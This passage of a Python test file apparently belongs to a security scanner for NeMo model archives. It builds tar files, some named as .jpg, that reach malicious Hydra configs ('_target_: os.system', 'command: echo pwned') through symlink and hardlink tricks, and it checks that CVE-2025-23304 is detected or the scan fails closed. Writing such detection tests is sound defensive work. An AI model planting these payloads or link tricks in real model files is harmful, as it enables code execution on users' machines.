            _add_tar_bytes(archive, payload_name, b"model:\n  _target_: os.system\n  command: echo pwned\n")
            link_info = tarfile.TarInfo(config_name)
            link_info.type = link_type
            link_info.linkname = "payload.txt"
            archive.addfile(link_info)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_routes_forward_hardlink_root_config_for_fail_closed_scan(self, tmp_path: Path) -> None:
        path = tmp_path / "forward-hardlink-config.jpg"
        with tarfile.open(path, "w") as archive:
            link_info = tarfile.TarInfo("model_config.yaml")
            link_info.type = tarfile.LNKTYPE
            link_info.linkname = "payload.txt"
            archive.addfile(link_info)
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_core_routes_forward_hardlink_root_config_chain_for_fail_closed_scan(self, tmp_path: Path) -> None:
        path = tmp_path / "forward-hardlink-config-chain.jpg"
        with tarfile.open(path, "w") as archive:
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "alias.yaml"
            archive.addfile(root_link)
            alias_link = tarfile.TarInfo("alias.yaml")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.txt"
            archive.addfile(alias_link)
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_declared_nemo_does_not_analyze_forward_hardlink_root_config(self, tmp_path: Path) -> None:
        path = tmp_path / "forward-hardlink-config.nemo"
        with tarfile.open(path, "w") as archive:
            link_info = tarfile.TarInfo("model_config.yaml")
            link_info.type = tarfile.LNKTYPE
            link_info.linkname = "payload.txt"
            archive.addfile(link_info)
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = NemoScanner().scan(str(path))

        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]
        assert "nemo_config_missing" in result.metadata["scan_outcome_reasons"]

    def test_core_routes_backward_hardlink_root_config_chain(self, tmp_path: Path) -> None:
        path = tmp_path / "backward-hardlink-config-chain.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            alias_link = tarfile.TarInfo("alias.yaml")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.txt"
            archive.addfile(alias_link)
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "alias.yaml"
            archive.addfile(root_link)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_routes_forward_symlink_root_config_chain(self, tmp_path: Path) -> None:
        path = tmp_path / "forward-symlink-config-chain.jpg"
        with tarfile.open(path, "w") as archive:
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.SYMTYPE
            root_link.linkname = "alias.yaml"
            archive.addfile(root_link)
            alias_link = tarfile.TarInfo("alias.yaml")
            alias_link.type = tarfile.SYMTYPE
            alias_link.linkname = "payload.txt"
            archive.addfile(alias_link)
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_does_not_report_shadowed_malicious_hardlink_chain_target(self, tmp_path: Path) -> None:
        path = tmp_path / "shadowed-hardlink-config-chain.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            alias_link = tarfile.TarInfo("alias.yaml")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.txt"
            archive.addfile(alias_link)
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "alias.yaml"
            archive.addfile(root_link)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_core_reports_later_hardlink_target_replacement(self, tmp_path: Path) -> None:
        path = tmp_path / "later-hardlink-config-replacement.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            link_info = tarfile.TarInfo("model_config.yaml")
            link_info.type = tarfile.LNKTYPE
            link_info.linkname = "payload.txt"
            archive.addfile(link_info)
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_does_not_report_later_safe_hardlink_target_replacement(self, tmp_path: Path) -> None:
        path = tmp_path / "later-safe-hardlink-config-replacement.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: initial\n")
            link_info = tarfile.TarInfo("model_config.yaml")
            link_info.type = tarfile.LNKTYPE
            link_info.linkname = "payload.txt"
            archive.addfile(link_info)
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_core_reports_hardlink_content_after_target_symlink_rebinding(self, tmp_path: Path) -> None:
        path = tmp_path / "hardlink-config-target-rebinding.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "payload.txt"
            archive.addfile(root_link)
            target_rebinding = tarfile.TarInfo("payload.txt")
            target_rebinding.type = tarfile.SYMTYPE
            target_rebinding.linkname = "safe.txt"
            archive.addfile(target_rebinding)
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_reports_write_through_later_hardlink_alias(self, tmp_path: Path) -> None:
        path = tmp_path / "hardlink-config-later-alias-write.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "payload.txt"
            archive.addfile(root_link)
            alias_link = tarfile.TarInfo("alias.txt")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "model_config.yaml"
            archive.addfile(alias_link)
            _add_tar_bytes(archive, "alias.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_reports_write_through_later_symlink_alias(self, tmp_path: Path) -> None:
        path = tmp_path / "hardlink-config-later-symlink-write.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "payload.txt"
            archive.addfile(root_link)
            alias_link = tarfile.TarInfo("alias.txt")
            alias_link.type = tarfile.SYMTYPE
            alias_link.linkname = "model_config.yaml"
            archive.addfile(alias_link)
            _add_tar_bytes(archive, "alias.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_reports_colliding_hardlink_fallback_write(self, tmp_path: Path) -> None:
        path = tmp_path / "hardlink-config-collision-write.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            alias_link = tarfile.TarInfo("alias.txt")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.txt"
            archive.addfile(alias_link)
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "alias.txt"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "evil.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            colliding_link = tarfile.TarInfo("alias.txt")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "evil.txt"
            archive.addfile(colliding_link)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_reports_nested_hardlink_fallback_write(self, tmp_path: Path) -> None:
        path = tmp_path / "hardlink-config-nested-collision-write.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            alias_link = tarfile.TarInfo("alias.txt")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.txt"
            archive.addfile(alias_link)
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "alias.txt"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "metadata.yaml", b"model: safe\n")
            _add_tar_bytes(archive, "evil.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            evil_alias = tarfile.TarInfo("evil_alias.txt")
            evil_alias.type = tarfile.LNKTYPE
            evil_alias.linkname = "evil.txt"
            archive.addfile(evil_alias)
            colliding_link = tarfile.TarInfo("alias.txt")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "evil_alias.txt"
            archive.addfile(colliding_link)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_preserves_hardlink_content_when_collision_falls_back_to_symlink(self, tmp_path: Path) -> None:
        path = tmp_path / "hardlink-config-collision-symlink-fallback.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            alias_link = tarfile.TarInfo("alias.txt")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.txt"
            archive.addfile(alias_link)
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "alias.txt"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "metadata.yaml", b"model: safe\n")
            safe_link = tarfile.TarInfo("safe_alias.txt")
            safe_link.type = tarfile.SYMTYPE
            safe_link.linkname = "safe.txt"
            archive.addfile(safe_link)
            colliding_link = tarfile.TarInfo("alias.txt")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "safe_alias.txt"
            archive.addfile(colliding_link)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_fallback_symlink_back_to_hardlink_inode_fails_closed(self, tmp_path: Path) -> None:
        path = tmp_path / "hardlink-config-symlink-back-to-inode.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "payload.txt"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "metadata.yaml", b"model: safe\n")
            same_inode_link = tarfile.TarInfo("same.txt")
            same_inode_link.type = tarfile.SYMTYPE
            same_inode_link.linkname = "payload.txt"
            archive.addfile(same_inode_link)
            colliding_link = tarfile.TarInfo("model_config.yaml")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "same.txt"
            archive.addfile(colliding_link)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_core_uses_final_duplicate_symlink_root_config(self, tmp_path: Path) -> None:
        path = tmp_path / "duplicate-root-symlink-final-target.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "safe.txt", b"model: safe\n")
            first_link = tarfile.TarInfo("model_config.yaml")
            first_link.type = tarfile.SYMTYPE
            first_link.linkname = "safe.txt"
            archive.addfile(first_link)
            _add_tar_bytes(archive, "evil.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            final_link = tarfile.TarInfo("model_config.yaml")
            final_link.type = tarfile.SYMTYPE
            final_link.linkname = "evil.txt"
            archive.addfile(final_link)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_uses_final_colliding_hardlink_root_config(self, tmp_path: Path) -> None:
        path = tmp_path / "final-colliding-hardlink-root-config.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "safe.txt", b"model: safe\n")
            first_link = tarfile.TarInfo("model_config.yaml")
            first_link.type = tarfile.LNKTYPE
            first_link.linkname = "safe.txt"
            archive.addfile(first_link)
            _add_tar_bytes(archive, "evil.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            final_link = tarfile.TarInfo("model_config.yaml")
            final_link.type = tarfile.LNKTYPE
            final_link.linkname = "evil.txt"
            archive.addfile(final_link)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_outer_symlink_detects_colliding_hardlink_mutation(self, tmp_path: Path) -> None:
        path = tmp_path / "outer-symlink-hardlink-mutation.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            alias_link = tarfile.TarInfo("alias.txt")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.txt"
            archive.addfile(alias_link)
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.SYMTYPE
            root_link.linkname = "alias.txt"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "evil.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            evil_link = tarfile.TarInfo("evil_link.txt")
            evil_link.type = tarfile.SYMTYPE
            evil_link.linkname = "evil.txt"
            archive.addfile(evil_link)
            colliding_link = tarfile.TarInfo("alias.txt")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "evil_link.txt"
            archive.addfile(colliding_link)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_outer_symlink_does_not_report_rebound_safe_content(self, tmp_path: Path) -> None:
        path = tmp_path / "outer-symlink-hardlink-safe-rebinding.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            alias_link = tarfile.TarInfo("alias.txt")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.txt"
            archive.addfile(alias_link)
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.SYMTYPE
            root_link.linkname = "alias.txt"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "safe.txt", b"model: safe\n")
            safe_link = tarfile.TarInfo("safe_link.txt")
            safe_link.type = tarfile.SYMTYPE
            safe_link.linkname = "safe.txt"
            archive.addfile(safe_link)
            colliding_link = tarfile.TarInfo("alias.txt")
            colliding_link.type = tarfile.LNKTYPE
            colliding_link.linkname = "safe_link.txt"
            archive.addfile(colliding_link)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_core_reports_unknown_type_hardlink_write_through(self, tmp_path: Path) -> None:
        path = tmp_path / "unknown-type-hardlink-write.jpg"
        malicious_config = b"model:\n  _target_: os.system\n  command: echo pwned\n"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "payload.txt"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "metadata.yaml", b"model: safe\n")
            unknown_payload = tarfile.TarInfo("payload.txt")
            unknown_payload.type = b"Z"
            unknown_payload.size = len(malicious_config)
            archive.addfile(unknown_payload, io.BytesIO(malicious_config))

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_reports_direct_unknown_type_root_config(self, tmp_path: Path) -> None:
        path = tmp_path / "direct-unknown-type-root-config.jpg"
        malicious_config = b"model:\n  _target_: os.system\n  command: echo pwned\n"
        with tarfile.open(path, "w") as archive:
            unknown_config = tarfile.TarInfo("model_config.yaml")
            unknown_config.type = b"Z"
            unknown_config.size = len(malicious_config)
            archive.addfile(unknown_config, io.BytesIO(malicious_config))
            _add_tar_bytes(archive, "metadata.yaml", b"model: safe\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_reports_multi_hop_symlink_write_through(self, tmp_path: Path) -> None:
        path = tmp_path / "multi-hop-symlink-write-through.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            alias_two = tarfile.TarInfo("alias-2.txt")
            alias_two.type = tarfile.SYMTYPE
            alias_two.linkname = "payload.txt"
            archive.addfile(alias_two)
            alias_one = tarfile.TarInfo("alias-1.txt")
            alias_one.type = tarfile.SYMTYPE
            alias_one.linkname = "alias-2.txt"
            archive.addfile(alias_one)
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.SYMTYPE
            root_link.linkname = "alias-1.txt"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "alias-2.txt", b"model: safe\n")
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_hardlink_to_symlink_source_fails_closed(self, tmp_path: Path) -> None:
        path = tmp_path / "hardlink-to-symlink-source.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            alias_link = tarfile.TarInfo("alias.txt")
            alias_link.type = tarfile.SYMTYPE
            alias_link.linkname = "payload.txt"
            archive.addfile(alias_link)
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "alias.txt"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "metadata.yaml", b"model: safe\n")
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_core_does_not_attribute_loaded_hardlink_through_relative_symlink_source(self, tmp_path: Path) -> None:
        path = tmp_path / "relative-symlink-hardlink-source.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "dir/payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            alias_link = tarfile.TarInfo("dir/alias")
            alias_link.type = tarfile.SYMTYPE
            alias_link.linkname = "payload.txt"
            archive.addfile(alias_link)
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "dir/alias"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "metadata.yaml", b"model: safe\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_core_fails_closed_when_relative_symlink_hardlink_may_load_root_payload(self, tmp_path: Path) -> None:
        path = tmp_path / "relative-symlink-hardlink-root-payload.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "dir/safe.txt", b"model: safe\n")
            alias_link = tarfile.TarInfo("dir/alias")
            alias_link.type = tarfile.SYMTYPE
            alias_link.linkname = "safe.txt"
            archive.addfile(alias_link)
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "dir/alias"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "safe.txt", b"model:\n  _target_: torch.utils.cpp_extension.load\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]

    def test_core_fails_closed_when_fifo_precedes_relative_symlink_hardlink(self, tmp_path: Path) -> None:
        path = tmp_path / "fifo-relative-symlink-hardlink-source.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "dir/payload.txt", b"model:\n  _target_: torch.utils.cpp_extension.load\n")
            alias_link = tarfile.TarInfo("dir/alias")
            alias_link.type = tarfile.SYMTYPE
            alias_link.linkname = "payload.txt"
            archive.addfile(alias_link)
            fifo_member = tarfile.TarInfo("model_config.yaml")
            fifo_member.type = tarfile.FIFOTYPE
            archive.addfile(fifo_member)
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "dir/alias"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)

    def test_declared_nemo_symlink_target_created_through_alias_fails_closed(self, tmp_path: Path) -> None:
        path = tmp_path / "symlink-target-created-through-alias.nemo"
        with tarfile.open(path, "w") as archive:
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.SYMTYPE
            root_link.linkname = "payload.txt"
            archive.addfile(root_link)
            writer_link = tarfile.TarInfo("writer.txt")
            writer_link.type = tarfile.SYMTYPE
            writer_link.linkname = "payload.txt"
            archive.addfile(writer_link)
            _add_tar_bytes(archive, "writer.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            _add_tar_bytes(archive, "metadata.yaml", b"model: safe\n")

        result = NemoScanner().scan(str(path))

        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_core_routes_symlink_target_created_through_alias_and_fails_closed(self, tmp_path: Path) -> None:
        path = tmp_path / "symlink-target-created-through-alias.jpg"
        with tarfile.open(path, "w") as archive:
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.SYMTYPE
            root_link.linkname = "payload.txt"
            archive.addfile(root_link)
            writer_link = tarfile.TarInfo("writer.txt")
            writer_link.type = tarfile.SYMTYPE
            writer_link.linkname = "payload.txt"
            archive.addfile(writer_link)
            _add_tar_bytes(archive, "writer.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            _add_tar_bytes(archive, "metadata.yaml", b"model: safe\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_core_regular_root_write_after_link_history_fails_closed(self, tmp_path: Path) -> None:
        path = tmp_path / "regular-root-after-link-history.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "payload.txt", b"model: safe\n")
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.SYMTYPE
            root_link.linkname = "payload.txt"
            archive.addfile(root_link)
            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(archive, "payload.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_core_routes_hardlink_target_created_through_symlink_write_and_fails_closed(self, tmp_path: Path) -> None:
        path = tmp_path / "hardlink-target-created-through-symlink.jpg"
        with tarfile.open(path, "w") as archive:
            writer_link = tarfile.TarInfo("writer.txt")
            writer_link.type = tarfile.SYMTYPE
            writer_link.linkname = "payload.txt"
            archive.addfile(writer_link)
            _add_tar_bytes(archive, "writer.txt", b"model:\n  _target_: os.system\n  command: echo pwned\n")
            root_link = tarfile.TarInfo("model_config.yaml")
            root_link.type = tarfile.LNKTYPE
            root_link.linkname = "payload.txt"
            archive.addfile(root_link)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_core_routes_ancestor_symlink_materialized_root_config_and_fails_closed(self, tmp_path: Path) -> None:
        path = tmp_path / "ancestor-symlink-root-config.jpg"
        with tarfile.open(path, "w") as archive:
            ancestor_link = tarfile.TarInfo("alias")
            ancestor_link.type = tarfile.SYMTYPE
            ancestor_link.linkname = "."
            archive.addfile(ancestor_link)
            _add_tar_bytes(
                archive, "alias/model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n"
            )

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_routes_symlink_write_through_to_root_config_and_fails_closed(self, tmp_path: Path) -> None:
        path = tmp_path / "symlink-write-through-root-config.jpg"
        with tarfile.open(path, "w") as archive:
            writer_link = tarfile.TarInfo("writer.yaml")
            writer_link.type = tarfile.SYMTYPE
            writer_link.linkname = "model_config.yaml"
            archive.addfile(writer_link)
            _add_tar_bytes(archive, "writer.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert "nemo_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_routes_composed_symlink_binary_write_to_root_config_and_fails_closed(self, tmp_path: Path) -> None:
        path = tmp_path / "composed-symlink-write-through-root-config.jpg"
        with tarfile.open(path, "w") as archive:
            ancestor_link = tarfile.TarInfo("alias")
            ancestor_link.type = tarfile.SYMTYPE
            ancestor_link.linkname = "."
            archive.addfile(ancestor_link)
            writer_link = tarfile.TarInfo("writer.bin")
            writer_link.type = tarfile.SYMTYPE
